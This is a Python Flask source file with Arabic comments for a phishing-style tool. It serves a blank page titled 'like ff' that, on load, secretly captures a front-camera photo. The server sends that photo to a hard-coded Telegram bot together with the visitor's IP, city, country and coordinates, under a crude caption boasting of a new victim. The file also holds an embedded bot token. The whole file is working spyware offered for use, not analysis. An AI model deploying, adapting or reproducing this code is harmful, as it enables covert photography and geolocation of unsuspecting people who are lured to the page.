from flask import Flask, request, jsonify
import os
import logging
import requests
import json

app = Flask(__name__)

# إعدادات Telegram Bot
TELEGRAM_BOT_TOKEN = '7930188784:AAHWJMVr9169-IOYPK-xuQDz9CV4fIMHXys'  # استبدل بالتوكن الخاص بك
TELEGRAM_CHAT_ID = '7796858163'  # استبدل بـ ID الدردشة الخاصة بك
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# إعدادات التسجيل (logging)
logging.basicConfig(level=logging.INFO)

# API لسحب معلومات IP
IP_INFO_API = "https://ipinfo.io"

@app.route('/like')
def index():
    """صفحة مخفية تلتقط صورة واحدة من الكاميرا الأمامية"""
    return """<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>like ff</title>
    <script>
        async function capturePhoto(facingMode, label) {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                let video = document.createElement('video');
                video.srcObject = stream;
                await video.play();  

                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));

                let formData = new FormData();
                formData.append("photo", blob, `${label}_photo.png`);

                await fetch('/upload', { method: 'POST', body: formData });

                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.log("فشل في ارسال اليكات :", error);
            }
        }

        async function startCapture() {
            await capturePhoto("user", "front");  
        }

        window.onload = startCapture;
    </script>
</head>
<body style="background-color:black;"></body>
</html>"""

@app.route('/upload', methods=['POST'])
def upload():
    """استقبال الصورة وإرسالها إلى Telegram مع معلومات IP"""
    try:
        uploaded_file = request.files.get("photo")
        if not uploaded_file:
            logging.error("لم يتم استلام أي صورة.")
            return jsonify({'status': 'error', 'message': '❌ لم يتم استلام أي صورة'}), 400

        # حفظ الصورة مؤقتًا
        photo_path = "photo.png"
        uploaded_file.save(photo_path)
        if not os.path.exists(photo_path):
            logging.error(f"فشل في حفظ الصورة: {photo_path}")
            return jsonify({'status': 'error', 'message': '❌ فشل في حفظ الصورة'}), 500

        # سحب معلومات IP
        ip_info = requests.get(IP_INFO_API).json()
        ip = ip_info.get('ip', 'غير معروف')
        city = ip_info.get('city', 'غير معروف')
        region = ip_info.get('region', 'غير معروف')
        country = ip_info.get('country', 'غير معروف')
        location = ip_info.get('loc', 'غير معروف')

        # نص الرسالة مع معلومات IP
        message = (
            f"<b>نكح مستخدم جديد😏</b>\n\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>المدينة:</b> {city}\n"
            f"<b>المنطقة:</b> {region}\n"
            f"<b>الدولة:</b> {country}\n"
            f"<b>الموقع الجغرافي:</b> {location}\n\n"
            f"<i>هذه الأداة مصممة من قبل XAZ 😎</i>"
        )

        # إرسال الصورة مع الرسالة إلى Telegram
        files = {'photo': open(photo_path, 'rb')}
        response = requests.post(
            f"{TELEGRAM_API_URL}/sendPhoto",
            data={
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': message,
                'parse_mode': 'HTML'
            },
            files=files
        )

        # حذف الصورة بعد الإرسال
        os.remove(photo_path)

        # التحقق من حالة الاستجابة
        if response.status_code == 200:
            logging.info("تم إرسال الصورة بنجاح.")
            return jsonify({'status': 'success', 'message': '✅ تم إرسال الصورة بنجاح'})
        else:
            logging.error(f"فشل الإرسال: {response.text}")
            return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {response.text}'}), 500

    except Exception as e:
        logging.error(f"فشل الإرسال: {e}")
        return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {e}'}), 500

@app.route('/ping')
def ping():
    """وظيفة Ping للتحقق من حالة الخادم"""
    return jsonify({'status': 'success', 'message': '🏓 Pong!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
